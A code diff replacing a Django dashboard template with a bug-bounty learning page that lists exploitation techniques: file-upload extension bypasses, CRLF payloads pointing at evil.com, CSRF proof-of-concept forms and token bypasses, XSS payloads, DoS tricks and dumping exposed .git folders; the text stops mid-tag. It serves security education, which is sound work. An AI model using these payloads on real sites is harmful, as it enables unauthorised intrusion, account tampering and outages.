@@ -1,417 +1,1580 @@
-{% load static %}
-<!DOCTYPE html>
-<html lang="en" dir="ltr">
-  <head>
-    <meta charset="UTF-8" />
-    <title>SafeSecureAudit</title>
-    <link rel="stylesheet" href="{% static 'style.css' %}" />
-    <!-- Boxiocns CDN Link -->
-    <link
-      href="https://unpkg.com/boxicons@2.0.7/css/boxicons.min.css"
-      rel="stylesheet"
-    />
-    <link
-      href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css"
-      rel="stylesheet"
-    />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <style>
-      @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap");
-      * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-        font-family: "Poppins", sans-serif;
-      }
-      body {
-        overflow: hidden;
-      }
-      .sidebar {
-        position: fixed;
-        top: 0;
-        left: 0;
-        height: 100%;
-        width: 260px;
-        background: #11101d;
-        z-index: 100;
-        transition: all 0.8s ease;
-      }
-      /* .sidebar.close {
-        width: 78px;
-      } */
-      .sidebar .logo-details {
-        height: 60px;
-        width: 100%;
-        display: flex;
-        align-items: center;
-      }
-      .sidebar .logo-details i {
-        font-size: 30px;
-        color: #fff;
-        height: 50px;
-        min-width: 78px;
-        text-align: center;
-        line-height: 50px;
-      }
-      .sidebar .logo-details .logo_name {
-        font-size: 22px;
-        color: #fff;
-        font-weight: 600;
-        transition: all 0.8s ease;
-        /* transition-delay: 0.8s; */
-      }
-      .sidebar.close .logo-details .logo_name {
-        transition-delay: 0s;
-        opacity: 0;
-        pointer-events: none;
-      }
-      .sidebar .nav-links {
-        height: 100%;
-        padding: 30px 0 150px 0;
-        overflow: auto;
-      }
-      .sidebar.close .nav-links {
-        overflow: visible;
-      }
-      .sidebar .nav-links::-webkit-scrollbar {
-        display: none;
-      }
-      .sidebar .nav-links li {
-        position: relative;
-        list-style: none;
-        border-bottom: 0.5px solid rgb(43, 43, 47);
-        /* transition: all 0.3s ease; */
-      }
-      .sidebar .nav-links li:hover {
-        background: #1d1b31;
-      }
-      .sidebar .nav-links li .iocn-link {
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-      }
-      .sidebar.close .nav-links li .iocn-link {
-        display: block;
-      }
-      .sidebar .nav-links li i {
-        height: 50px;
-        min-width: 78px;
-        text-align: center;
-        line-height: 50px;
-        color: #fff;
-        font-size: 20px;
-        cursor: pointer;
-        transition: all 0.8s ease;
-      }
-      .sidebar .nav-links li.showMenu i.arrow {
-        transform: rotate(-180deg);
-      }
-      .sidebar.close .nav-links i.arrow {
-        display: none;
-      }
-      .sidebar .nav-links li a {
-        display: block;
-        text-align: left;
-        padding-left: 15px;
-        padding-bottom: 6px;
-        text-decoration: none;
-      }
-      .sidebar .nav-links li a .link_name {
-        font-size: 18px;
-        font-weight: 400;
-        /* color: #fff; */
-        transition: all 0.3s ease;
-      }
+{% extends './base.html' %}
+<div class="content">{% block body %}
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Learning Path for Hacker</title>
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+        <style>
+            body {
+                font-family: Arial, sans-serif;
+                margin: 0;
+                padding: 0;
+                background-color: #ffffff;
+                color: #fff;
+            }
 
-      .sidebar.close .nav-links li a .link_name {
-        opacity: 0;
-        pointer-events: none;
-      }
-      .sidebar .nav-links li .sub-menu {
-        padding: 6px 6px 14px 80px;
-        margin-top: -10px;
-        background: #1d1b31;
-        display: none;
-      }
-      .sidebar .nav-links li.showMenu .sub-menu {
-        display: block;
-        -webkit-animation: slide-down 0.8s ease-out;
-      }
-      @-webkit-keyframes slide-down {
-        0% {
-          opacity: 0;
-        }
+            .learning-path {
+                margin: 50px auto;
+                padding: 30px;
+                background-color: #fffafa;
+                border-radius: 8px;
+                box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            }
 
-        100% {
-          opacity: 1;
-        }
-      }
+            h1 {
+                text-align: center;
+                margin-bottom: 30px;
+                color: #000000;
+            }
 
-      .sidebar .nav-links li .sub-menu a {
-        color: #fff;
-        font-size: 15px;
-        padding: 5px 0;
-        white-space: nowrap;
-        opacity: 0.6;
-        transition: all 0.3s ease;
-      }
-      .sidebar .nav-links li .sub-menu a:hover {
-        opacity: 1;
-      }
-      .sidebar.close .nav-links li .sub-menu {
-        position: absolute;
-        left: 100%;
-        top: -10px;
-        margin-top: 0;
-        padding: 10px 20px;
-        border-radius: 0 6px 6px 0;
-        opacity: 0;
-        display: block;
-        pointer-events: none;
-        transition: 0.8s;
-      }
-      .sidebar.close .nav-links li:hover .sub-menu {
-        top: 0;
-        opacity: 1;
-        pointer-events: auto;
-        transition: all 0.8s ease;
-      }
-      .sidebar .nav-links li .sub-menu .link_name {
-        display: none;
-      }
-      .sidebar.close .nav-links li .sub-menu .link_name {
-        font-size: 18px;
-        opacity: 1;
-        display: block;
-      }
-      .sidebar .nav-links li .sub-menu.blank {
-        opacity: 1;
-        pointer-events: auto;
-        padding: 3px 20px 6px 16px;
-        opacity: 0;
-        pointer-events: none;
-      }
-      .sidebar .nav-links li:hover .sub-menu.blank {
-        top: 50%;
-        transform: translateY(-50%);
-      }
-      .sidebar .profile-details {
-        position: fixed;
-        bottom: 0;
-        width: 260px;
-        display: flex;
-        align-items: center;
-        justify-content: space-evenly;
-        background: #1d1b31;
-        padding: 12px 0;
-        transition: all 0.8s ease;
-      }
-      .sidebar.close .profile-details {
-        background: none;
-      }
-      .sidebar.close .profile-details {
-        width: 78px;
-      }
-      .sidebar .profile-details .profile-content {
-        display: flex;
-        align-items: center;
-      }
-      .sidebar .profile-details img {
-        height: 52px;
-        width: 52px;
-        object-fit: cover;
-        border-radius: 16px;
-        margin: 0 14px 0 12px;
-        background: #1d1b31;
-        transition: all 0.8s ease;
-      }
-      .sidebar.close .profile-details img {
-        padding: 10px;
-      }
-      .sidebar .profile-details .profile_name,
-      .sidebar .profile-details .job {
-        color: #fff;
-        font-size: 18px;
-        font-weight: 500;
-        white-space: nowrap;
-      }
-      .sidebar.close .profile-details i,
-      .sidebar.close .profile-details .profile_name,
-      .sidebar.close .profile-details .job {
-        display: none;
-      }
-      .sidebar .profile-details .job {
-        font-size: 12px;
-      }
-      .home-section {
-        position: relative;
-        background: #e4e9f7;
-        height: 100vh;
-        left: 260px;
-        width: calc(100% - 260px);
-        transition: all 0.8s ease;
-        padding: 12px;
-      }
-      .sidebar.close ~ .home-section {
-        left: 78px;
-        width: calc(100% - 78px);
-      }
-      .home-content {
-        display: flex;
-        align-items: center;
-        flex-wrap: wrap;
-      }
-      .home-section .home-content .bx-menu,
-      .home-section .home-content .text {
-        color: #11101d;
-        font-size: 35px;
-      }
-      .home-section .home-content .bx-menu {
-        cursor: pointer;
-        margin-right: 10px;
-      }
-      .home-section .home-content .text {
-        font-size: 26px;
-        font-weight: 600;
-      }
+            .task {
+                margin-bottom: 10px;
+            }
 
-      @media screen and (max-width: 400px) {
-        .sidebar {
-          width: 240px;
-        }
-        .sidebar.close {
-          width: 78px;
-        }
-        .sidebar .profile-details {
-          width: 240px;
-        }
-        .sidebar.close .profile-details {
-          background: none;
-        }
-        .sidebar.close .profile-details {
-          width: 78px;
-        }
-        .home-section {
-          left: 240px;
-          width: calc(100% - 240px);
-        }
-        .sidebar.close ~ .home-section {
-          left: 78px;
-          width: calc(100% - 78px);
-        }
-      }
-    </style>
-  </head>
-  <body>
-    <div class="sidebar">
-      <div class="logo-details">
-        <a href="/"><i class="bx bxs-shield-plus"></i></a>
-        <a href="/"><span class="logo_name">SSA</span></a>
-      </div>
-      <ul class="nav-links">
-        <li>
-          <a href="{% url 'Allaboutbugbounty' %}?vuln10=Arbitrary_File_Upload">
-            <span class="link_name">Arbitrary File Upload</span>
-          </a>
-        </li>
-        <li>
-          <a href="{% url 'Allaboutbugbounty' %}?vuln10=CRLF_Injection">
-            <span class="link_name">CRLF Injection</span>
-          </a>
-        </li>
-        <li>
-          <a href="{% url 'Allaboutbugbounty' %}?vuln10=csrf">
-            <span class="link_name">Cross Site Request Forgery</span>
-          </a>
-        </li>
-        <li>
-          <a href="{% url 'Allaboutbugbounty' %}?vuln10=xss">
-            <span class="link_name">Cross Site Scripting</span>
-          </a>
-        </li>
-        <li>
-          <a href="{% url 'Allaboutbugbounty' %}?vuln10=dos">
-            <span class="link_name">Denial of Service</span>
-          </a>
-        </li>
-        <li>
-          <a href="{% url 'Allaboutbugbounty' %}?vuln10=ExposedSourceCode">
-            <span class="link_name">Exposed Source Code</span>
-          </a>
-        </li>
-        <li>
-          <a href="{% url 'Allaboutbugbounty' %}?vuln10=HostHeaderInjection">
-            <span class="link_name">Host Header Injection</span>
-          </a>
-        </li>
-        <li>
-          <a
-            href="{% url 'Allaboutbugbounty' %}?vuln10=InsecureDirectObjectReferences"
-          >
-            <span class="link_name">Insecure Direct Object References</span>
-          </a>
-        </li>
-        <li>
-          <a href="{% url 'Allaboutbugbounty' %}?vuln10=Open_Redirect">
-            <span class="link_name">Open Redirect</span>
-          </a>
-        </li>
-        <li>
-          <a
-            href="{% url 'Allaboutbugbounty' %}?vuln10=ServerSideIncludeInjection"
-          >
-            <span class="link_name">Server Side Include Injection</span>
-          </a>
-        </li>
-        <li>
-          <a href="{% url 'Allaboutbugbounty' %}?vuln10=SQLInjection">
-            <span class="link_name">SQL Injection</span>
-          </a>
-        </li>
-        <li>
-          <a href="{% url 'Allaboutbugbounty' %}?vuln10=WebCachePoisoning">
-            <span class="link_name">Web Cache Poisoning</span>
-          </a>
-        </li>
-        <li>
-          <a href="{% url 'Allaboutbugbounty' %}?vuln10=OAuthMisconfiguration">
-            <span class="link_name">OAuth Misconfiguration</span>
-          </a>
-        </li>
-        <br /><br />
-        <hr />
-        <hr />
-        <li>
-          <a href="{% url 'learning' %}">
-            <span class="link_name">Learn CyberSecurity</span>
-          </a>
-        </li>
-        <li>
-          <a href="/">
-            <span class="link_name">HOME</span>
-          </a>
-        </li>
+            .task-title {
+                padding: 15px;
+                cursor: pointer;
+                background-color: rgb(21, 28, 43);
+                color: white;
+                border-radius: 4px;
+                margin-bottom: 5px;
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+            }
 
-        <li>
-          <div class="profile-details">
-            <div class="profile-content">
-              <img src="{% static 'image/profile.jpg' %}" alt="profileImg" />
+            .task-title:hover {
+                background-color: #444;
+            }
+
+            .task-content {
+                padding: 15px;
+                display: none;
+                background-color: #ffffff;
+                border-radius: 4px;
+                color: rgb(0, 0, 0);
+            }
+
+            .task-content p {
+                margin: 0;
+            }
+
+            .task-title i {
+                transition: transform 0.3s;
+            }
+
+            .task-title.open i {
+                transform: rotate(180deg);
+            }
+
+            /* CSS for ol and li elements */
+            .task-content ol {
+                padding-left: 20px;
+                margin-top: 10px;
+                margin-bottom: 10px;
+                color: #000000;
+            }
+
+            .task-content li {
+                margin-bottom: 10px;
+            }
+
+            .task-content pre {
+                background-color: #f4f4f4;
+                padding: 10px;
+                border-radius: 4px;
+                overflow-x: auto;
+            }
+
+            .task-content code {
+                background-color: #f4f4f4;
+                padding: 2px 4px;
+                border-radius: 4px;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="learning-path">
+            <h1>All about bug hunting</h1>
+            <div class="task" id="task1">
+                <div class="task-title" onclick="toggleTask('task1')">
+                    Task 1: Arbitrary File Upload
+                    <i class="fas fa-chevron-down"></i>
+                </div>
+                <div class="task-content"> 
+                    <h2>Introduction</h2>
+                    <p>
+                        An arbitrary file upload vulnerability is a type of security flaw
+                        that allows an attacker to upload malicious files onto a server.
+                    </p>
+
+                    <h2>Where to find</h2>
+                    <p>
+                        In upload file feature, for example upload photo profile feature
+                    </p>
+
+                    <h2>How to exploit</h2>
+                    <ol>
+                        <li>
+                            <p>Change the <code>Content-Type</code> value</p>
+                            <pre><code>POST /images/upload/ HTTP/1.1
+Host: target.com
+...
+---------------------------829348923824
+Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
+Content-Type: application/x-php</code></pre>
+                            <p>Change the Content-Type</p>
+                            <pre><code>POST /images/upload/ HTTP/1.1
+Host: target.com
+...
+---------------------------829348923824
+Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
+Content-Type: image/jpeg</code></pre>
+                        </li>
+                        <li>
+                            <p>Using null byte in filename</p>
+                            <pre><code>file.php%00.gif</code></pre>
+                        </li>
+                        <li>
+                            <p>Using double extensions for the uploaded file</p>
+                            <pre><code>file.jpg.php</code></pre>
+                        </li>
+                        <li>
+                            <p>Uploading an unpopular php extensions (php4,php5,php6,phtml)</p>
+                            <pre><code>file.php5</code></pre>
+                        </li>
+                        <li>
+                            <p>Try to randomly capitalize the file extension</p>
+                            <pre><code>file.pHP5</code></pre>
+                        </li>
+                        <li>
+                            <pre>Mix the tips!</pre>
+                        </li>
+                    </ol>
+                  </div> 
+                </div>
+                <div class="task" id="task2">
+                  <div class="task-title" onclick="toggleTask('task2')">
+                      Task 2: CRLF Injection
+                      <i class="fas fa-chevron-down"></i>
+                  </div>
+                  <div class="task-content">
+                      <h2>Introduction</h2>
+                      <p>
+                          A CRLF Injection attack occurs when a user manages to submit a
+                          CRLF into an application. This is most commonly done by modifying
+                          an HTTP parameter or URL.
+                      </p>
+              
+                      <h2>Where to find</h2>
+                      <p>
+                          It can be found anywhere, always check the request and response.
+                          Try to search for parameters that lead to redirects, you can see
+                          the response is (301, 302, 303, 307, 308).
+                      </p>
+              
+                      <h2>How to exploit</h2>
+                      <ol>
+                          <li>
+                              <p>Basic payload</p>
+                              <pre><code>https://example.com/?lang=en%0D%0ALocation:%20https://evil.com/</code></pre>
+                              <p>The response is</p>
+                              <pre><code>HTTP/1.1 200 OK
+              Content-Type: text/html
+              Date: Mon, 09 May 2016 14:47:29 GMT
+              Set-Cookie: language=en
+              Location: https://evil.com/</code></pre>
+                          </li>
+                          <li>
+                              <p>Double encode</p>
+                              <pre><code>https://example.com/?lang=en%250D%250ALocation:%20https://evil.com/</code></pre>
+                          </li>
+                          <li>
+                              <p>Bypass unicode</p>
+                              <pre><code>https://example.com/?lang=en%E5%98%8A%E5%98%8DLocation:%20https://evil.com/</code></pre>
+                          </li>
+                      </ol>
+              
+                      <h2>References</h2>
+                      <ul>
+                          <li>
+                              <a href="https://blog.innerht.ml/twitter-crlf-injection/">@filedescriptor</a>
+                          </li>
+                          <li>
+                              <a href="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md">EdOverflow</a>
+                          </li>
+                      </ul>
+                  </div>
+              </div>
+              <div class="task" id="task3">
+                <div class="task-title" onclick="toggleTask('task3')">
+                    Task 3: Cross-Site Request Forgery (CSRF)
+                    <i class="fas fa-chevron-down"></i>
+                </div>
+                <div class="task-content">
+                    <h2>Introduction</h2>
+                    <p>
+                        Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end
+                        user to execute unwanted actions on a web application in which they're
+                        currently authenticated.
+                    </p>
+            
+                    <h2>Where to find</h2>
+                    <p>
+                        Usually found in forms. Try submitting the form and check the HTTP
+                        request. If the HTTP request does not have a CSRF token then it is
+                        likely to be vulnerable to a CSRF attack.
+                    </p>
+            
+                    <h2>How to exploit</h2>
+                    <ol>
+                        <li>
+                            <p>HTML GET Method</p>
+                            <pre><code>&lt;a href="http://www.example.com/api/setusername?username=uname"&gt;Click Me&lt;/a&gt;</code></pre>
+                        </li>
+                        <li>
+                            <p>HTML POST Method</p>
+                            <pre><code>&lt;form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST"&gt;
+            &lt;input name="username" type="hidden" value="uname" /&gt;
+            &lt;input type="submit" value="Submit Request" /&gt;
+            &lt;/form&gt;</code></pre>
+                        </li>
+                        <li>
+                            <p>JSON GET Method</p>
+                            <pre><code>&lt;script&gt;
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", "http://www.example.com/api/currentuser");
+            xhr.send();
+            &lt;/script&gt;</code></pre>
+                        </li>
+                        <li>
+                            <p>JSON POST Method</p>
+                            <pre><code>&lt;script&gt;
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "http://www.example.com/api/setrole");
+            xhr.withCredentials = true;
+            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+            xhr.send('{"role":"admin"}');
+            &lt;/script&gt;</code></pre>
+                        </li>
+                        <li>
+                            <p>Multipart request</p>
+                            <pre><code>&lt;head&gt;
+            &lt;title&gt;Multipart CSRF PoC&lt;/title&gt;
+            &lt;/head&gt;
+            &lt;body&gt;
+            &lt;br&gt;
+            &lt;hr&gt;
+            &lt;h2&gt;Click Submit request&lt;/h2&gt;&lt;br&gt;
+            &lt;script&gt;
+            function submitRequest()
+            {
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", "https://example/api/users", true);
+                xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+                xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+                xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------149631704917378");
+                xhr.withCredentials = true;
+                var body = "-----------------------------149631704917378\r\n" + 
+                "Content-Disposition: form-data; name=\"action\"\r\n" + 
+                  "\r\n" + 
+                  "update\r\n" + 
+                  "-----------------------------149631704917378\r\n" + 
+                  "Content-Disposition: form-data; name=\"user_id\"\r\n" + 
+                  "\r\n" + 
+                  "1\r\n" + 
+                  "-----------------------------149631704917378\r\n" + 
+                  "Content-Disposition: form-data; name=\"uname\"\r\n" + 
+                  "\r\n" + 
+                  "daffainfo\r\n" + 
+                  "-----------------------------149631704917378\r\n" + 
+                  "Content-Disposition: form-data; name=\"first_name\"\r\n" + 
+                  "\r\n" + 
+                  "m\r\n" + 
+                  "-----------------------------149631704917378\r\n" + 
+                  "Content-Disposition: form-data; name=\"last_name\"\r\n" + 
+                  "\r\n" + 
+                  "daffa\r\n" + 
+                  "-----------------------------149631704917378--\r\n";
+                  var aBody = new Uint8Array(body.length);
+                  for (var i = 0; aBody.length; i++)
+                  aBody[i] = body.charCodeAt(i); 
+                  xhr.send(new Blob([aBody]));
+            }
+            &lt;/script&gt;
+            &lt;form action="#"&gt;
+            &lt;input type="button" value="Submit request" onclick="submitRequest();" /&gt;
+            &lt;/form&gt;
+            &lt;br&gt;
+            &lt;/body&gt;</code></pre>
+                        </li>
+                    </ol>
+            
+                    <h2>Bypass CSRF Token</h2>
+                    <p>
+                        In some cases, even though there is a CSRF token on the form, CSRF tokens can still be bypassed by doing a few things:
+                    </p>
+                    <ol>
+                        <li>
+                            <p>Change a single character</p>
+                            <pre><code>POST /register HTTP/1.1
+            Host: target.com
+            ...
+            
+            username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa</code></pre>
+                            <p>Try this to bypass</p>
+                            <pre><code>POST /register HTTP/1.1
+            Host: target.com
+            ...
+            
+            username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaab</code></pre>
+                        </li>
+                        <li>
+                            <p>Send an empty value for the token</p>
+                            <pre><code>POST /register HTTP/1.1
+            Host: target.com
+            ...
+            
+            username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa</code></pre>
+                            <p>Try this to bypass</p>
+                            <pre><code>POST /register HTTP/1.1
+            Host: target.com
+            ...
+            
+            username=dapos&password=123456&token=</code></pre>
+                        </li>
+                        <li>
+                            <p>Replace the token with one of the same length</p>
+                            <pre><code>POST /register HTTP/1.1
+            Host: target.com
+            ...
+            
+            username=dapos&password=123456&token=aaaaaa</code></pre>
+                            <p>Try this to bypass</p>
+                            <pre><code>POST /register HTTP/1.1
+            Host: target.com
+            ...
+            
+            username=dapos&password=123456&token=aaabaa</code></pre>
+                        </li>
+                        <li>
+                            <p>Change POST to GET method</p>
+                            <pre><code>POST /register HTTP/1.1
+            Host: target.com
+            ...
+            
+            username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa</code></pre>
+                            <p>Try this to bypass</p>
+                            <pre><code>GET /register?username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa HTTP/1.1
+            Host: target.com
+            ...</code></pre>
+                        </li>
+                        <li>
+                            <p>Remove the token from the request</p>
+                            <pre><code>POST /register HTTP/1.1
+            Host: target.com
+            ...
+            
+            username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa</code></pre>
+                            <p>Try this to bypass</p>
+                            <pre><code>POST /register HTTP/1.1
+            Host: target.com
+            ...
+            
+            username=dapos&password=123456</code></pre>
+                        </li>
+                        <li>
+                            <p>Use another user's valid token</p>
+                            <pre><code>POST /register HTTP/1.1
+            Host: target.com
+            ...
+            
+            username=dapos&password=123456&token=ANOTHER_VALID_TOKEN</code></pre>
+                        </li>
+                        <li>
+                            <p>Try to decrypt the token</p>
+                            <pre><code>POST /register HTTP/1.1
+            Host: target.com
+            ...
+            
+            username=dapos&password=123456&token=MTIzNDU2</code></pre>
+                            <p>MTIzNDU2 => 123456 (base64 encoded)</p>
+                        </li>
+                        <li>
+                            <p>
+                                Sometimes the anti-CSRF token is composed of two parts, one of which remains static while the other is dynamic.
+                            </p>
+                            <pre><code>POST /register HTTP/1.1
+            Host: target.com
+            ...
+            
+            username=dapos&password=123456&token=vi802jg9f8akd9j123</code></pre>
+                            <p>When we register again, the request looks like this:</p>
+                            <pre><code>POST /register HTTP/1.1
+            Host: target.com
+            ...
+            
+            username=dapos&password=123456&token=vi802jg9f8akd9j124</code></pre>
+                            <p>
+                                If you notice "vi802jg9f8akd9j" part of the token remains the same, you just need to send only the static part.
+                            </p>
+                        </li>
+                    </ol>
+                </div>
             </div>
-            <div class="name-job">
-              <div class="profile_name">Anonymous</div>
-              <div class="job">Cyber Security Enthusiast</div>
-            </div>
+            <div class="task" id="task4">
+              <div class="task-title" onclick="toggleTask('task4')">
+                  Task 4: Cross-Site Scripting (XSS)
+                  <i class="fas fa-chevron-down"></i>
+              </div>
+              <div class="task-content">
+                  <h2>Introduction</h2>
+                  <p>Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into websites. There are 3 types of XSS attacks:</p>
+                  <ul>
+                      <li>Reflected XSS: Attack where the malicious script runs from another website through the web browser</li>
+                      <li>Stored XSS: Stored attacks are those where the injected script is permanently stored on the target servers</li>
+                      <li>DOM-Based XSS: A type of XSS that has payloads found in the DOM rather than within the HTML code</li>
+                  </ul>
+                  
+                  <h2>Where to find</h2>
+                  <p>This vulnerability can appear in all features of the application. If you want to find DOM-based XSS, you can find it by reading the JavaScript source code.</p>
+                  
+                  <h2>How to exploit</h2>
+                  <ol>
+                      <li>
+                          <p>Basic payload</p>
+                          <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
+          &lt;svg/onload=alert(1)&gt;
+          &lt;img src=x onerror=alert(1)&gt;</code></pre>
+                      </li>
+                      <li>
+                          <p>Add ' or " to escape the payload from value of an HTML tag</p>
+                          <pre><code>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+          '&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+                      </li>
+                      <li>
+                          <p>Add --&gt; to escape the payload if input lands in HTML comments.</p>
+                          <pre><code>--&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+                      </li>
+                      <li>
+                          <p>Add &lt;/tag&gt; when the input is inside or between opening/closing tags. The tag can be &lt;a&gt;, &lt;title&gt;, &lt;script&gt;, and any other HTML tags.</p>
+                          <pre><code>&lt;/tag&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+          "&gt;&lt;/tag&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+                      </li>
+                      <li>
+                          <p>Use when input is inside an attribute’s value of an HTML tag but &gt; is filtered.</p>
+                          <pre><code>" onmouseover=alert(1)
+          " autofocus onfocus=alert(1)</code></pre>
+                      </li>
+                      <li>
+                          <p>Use &lt;/script&gt; when input is inside &lt;script&gt; tags.</p>
+                          <pre><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+                      </li>
+                  </ol>
+                  
+                  <h3>XSS Cheat Sheet (Advanced)</h3>
+                  <p>For more advanced XSS techniques, please refer to the provided references.</p>
+                  
+                  <h3>XSS Cheat Sheet (Bypass)</h3>
+                  <p>For bypass techniques, please refer to the provided references.</p>
+                  
+                  <h2>References</h2>
+                  <ul>
+                      <li><a href="https://brutelogic.com.br/">Brute Logic</a></li>
+                      <li><a href="https://github.com/0xInfection/Awesome-WAF">Awesome-WAF</a></li>
+                      <li>Some random Twitter posts</li>
+                  </ul>
+              </div>
           </div>
-        </li>
-      </ul>
-    </div>
-    <section class="home-section">
-      <div class="home-content">
-        <span class="text">Learning</span>
+          <div class="task" id="task5">
+            <div class="task-title" onclick="toggleTask('task5')">
+                Task 5: Denial of Service (DoS)
+                <i class="fas fa-chevron-down"></i>
+            </div>
+            <div class="task-content">
+                <h2>Introduction</h2>
+                <p>
+                  Denial of Service is a type of attack on a service that disrupts its
+                  normal function and prevents other users from accessing it.
+                </p>
+        
+                <h2>Where to find</h2>
+                <p>
+                  This vulnerability can appear in all features of the application.
+                  Depending on how to exploit it, for example in the file upload
+                  feature, you can upload very large files.
+                </p>
+        
+                <h2>How to exploit</h2>
+                <ol>
+                  <li>
+                    <p>Cookie bomb</p>
+                    <pre><code>https://target.com/index.php?param1=xxxxxxxxxxxxxx</code></pre>
+                    <p>
+                      After inputting "xxxxxxxxxxxxxx" as a value of param1, check your
+                      cookies. If there are cookies with the value
+                      "xxxxxxxxxxxxxxxxxxxxxx", it means the website is vulnerable.
+                    </p>
+                  </li>
+                  <li>
+                    <p>Try inputting a very long payload into a form.</p>
+                    <pre><code>POST /register HTTP/1.1
+        Host: target.com
+        ...
+        
+        username=victim&password=aaaaaaaaaaaaaaa</code></pre>
+                  </li>
+                  <li>
+                    <p>Pixel flood, using an image with huge pixels</p>
+                  </li>
+                  <li>
+                    <p>Frame flood, using a GIF with many frames</p>
+                  </li>
+                  <li>
+                    <p>
+                      Sometimes on websites, we find a parameter that can adjust the size
+                      of the image
+                    </p>
+                    <pre><code>https://target.com/img/vulnerable.jpg?width=500&height=500</code></pre>
+                    <p>Try changing "500" to "99999999999"</p>
+                    <pre><code>https://target.com/img/vulnerable.jpg?width=99999999999&height=99999999999</code></pre>
+                  </li>
+                  <li>
+                    <p>Try changing the value of the header with something new</p>
+                    <pre><code>Accept-Encoding: gzip, gzip, deflate, br, br</code></pre>
+                  </li>
+                  <li>
+                    <p>
+                      Sometimes if you try "No rate limit" bugs, after many attempts, the
+                      server will go down because there are too many requests
+                    </p>
+                  </li>
+                  <li>
+                    <p>ReDoS (Regex DoS) occurs due to poorly implemented RegEx</p>
+                  </li>
+                  <li>
+                    <p>CPDoS (Cache Poisoned Denial of Service)</p>
+                    <ul>
+                      <li>HTTP Header Oversize (HHO)</li>
+                      <li>HTTP Meta Character (HMC)</li>
+                      <li>HTTP Method Override (HMO)</li>
+                      <li>X-Forwarded-Port</li>
+                      <li>X-Forwarded-Host</li>
+                    </ul>
+                    <p>
+                      For more details, refer to: <a href="https://cpdos.org/">CPDoS</a>
+                    </p>
+                  </li>
+                </ol>
+        
+                <h2>References</h2>
+                <ul>
+                  <li><a href="https://hackerone.com/reports/840598">Hackerone #840598</a></li>
+                  <li><a href="https://hackerone.com/reports/105363">Hackerone #105363</a></li>
+                  <li><a href="https://hackerone.com/reports/390">Hackerone #390</a></li>
+                  <li><a href="https://hackerone.com/reports/400">Hackerone #400</a></li>
+                  <li><a href="https://hackerone.com/reports/751904">Hackerone #751904</a></li>
+                  <li><a href="https://hackerone.com/reports/861170">Hackerone #861170</a></li>
+                  <li><a href="https://hackerone.com/reports/892615">Hackerone #892615</a></li>
+                  <li><a href="https://hackerone.com/reports/511381">Hackerone #511381</a></li>
+                  <li><a href="https://hackerone.com/reports/409370">Hackerone #409370</a></li>
+                  <li><a href="https://cpdos.org/">CPDoS</a></li>
+                </ul>
+            </div>
+        </div>     
+        <div class="task" id="task6">
+          <div class="task-title" onclick="toggleTask('task6')">
+              Task 6: Source Code Disclosure
+              <i class="fas fa-chevron-down"></i>
+          </div>
+          <div class="task-content">
+              <h2>Introduction</h2>
+              <p>
+                Source code intended to be kept server-side can sometimes end up being
+                disclosed to users. Such code may contain sensitive information such
+                as database passwords and secret keys, which may help malicious users
+                formulate attacks against the application.
+              </p>
+      
+              <h2>How to exploit</h2>
+              <ol>
+                <li>
+                  <p>Exposed Git folder</p>
+                  <pre><code>https://site.com/.git</code></pre>
+                  <p>
+                    Tools to dump .git:
+                    <a href="https://github.com/arthaud/git-dumper">git-dumper</a>
+                  </p>
+                  <img
+                    src="https://1.bp.blogspot.com/-wTZOuULaqNw/XliI9jS0w3I/AAAAAAAAATA/VZxs7VL5PCY8FdnoKaEjS6AWpcjoJz4MgCLcBGAsYHQ/s1600/1.png"
+                    alt="GIT folder"
+                  />
+                </li>
+                <li>
+                  <p>Exposed Subversion folder</p>
+                  <pre><code>https://site.com/.svn</code></pre>
+                  <p>
+                    Tools to dump .svn:
+                    <a href="https://github.com/anantshri/svn-extractor">svn-extractor</a>
+                  </p>
+                  <img
+                    src="https://1.bp.blogspot.com/-5bC_EhFShgk/XliJqiw8pJI/AAAAAAAAATI/2HhrX0Ea3MwQ60Ax2tzNprNvulggPrZAACLcBGAsYHQ/s1600/1.png"
+                    alt="SVN folder"
+                  />
+                </li>
+                <li>
+                  <p>Exposed Mercurial folder</p>
+                  <pre><code>https://site.com/.hg</code></pre>
+                  <p>
+                    Tools to dump .hg:
+                    <a href="https://github.com/arthaud/hg-dumper">hg-dumper</a>
+                  </p>
+                  <img
